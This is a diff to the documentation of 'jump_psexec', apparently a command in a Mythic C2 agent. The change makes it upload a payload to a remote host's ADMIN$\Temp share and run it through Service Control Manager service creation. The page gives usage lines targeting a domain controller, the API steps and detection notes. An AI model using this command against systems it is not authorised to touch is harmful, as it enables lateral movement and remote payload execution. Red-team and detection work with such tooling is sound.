@@ -6,26 +6,26 @@ weight = 103
 
 ## Summary
 
-Lateral movement via remote service creation. Creates and starts a Windows service on a remote host that executes the specified binary.
+Stage a payload to `\\target\ADMIN$\Temp` and execute via SCM service creation.
 
 - **Needs Admin:** True
-- **Version:** 1
+- **Version:** 2
 - **Author:** @Lavender-exe
 
 ### Arguments
 
 - **hostname** (String, required) - Target hostname or IP address.
+- **payload** (File, required) - Payload file to stage and execute on remote host.
 - **service_name** (String, optional) - Service name to create on the remote host. Default: `StarSvc`.
-- **binary_path** (String, required) - Full UNC path to the binary to execute as a service (e.g., `\\server\share\payload.exe`).
 
 ### Usage
 
 ```
-jump_psexec -hostname DC01 -binary_path \\10.0.0.5\share\svc.exe
+jump_psexec -hostname DC01 -payload <file>
 ```
 
 ```
-jump_psexec -hostname DC01 -service_name UpdateSvc -binary_path \\10.0.0.5\share\svc.exe
+jump_psexec -hostname DC01 -service_name UpdateSvc -payload <file>
 ```
 
 ## Detailed Summary
@@ -37,7 +37,7 @@ Connects to the remote host's Service Control Manager (SCM) and creates a new se
 3. Starts the service with `StartServiceW`
 4. Optionally deletes the service after execution with `DeleteService`
 
-The binary path must be accessible from the remote host (typically a UNC path to a writable share).
+The payload file is uploaded through Mythic and staged to `\\target\ADMIN$\Temp` with a random filename before service creation.
 
 ### APIs Used
 
@@ -61,7 +61,7 @@ Service creation on remote hosts is a well-known lateral movement technique. It 
 {{% /notice %}}
 
 - Requires local administrator privileges on the target host
-- The service binary must be staged on an accessible share first
+- The payload is automatically staged to `ADMIN$\Temp` on the target
 - Service creation events are logged in the System event log
 - The service name is visible in `services.msc` and `sc query` on the target
 - Consider using a `service_exe` output format payload for proper SCM integration
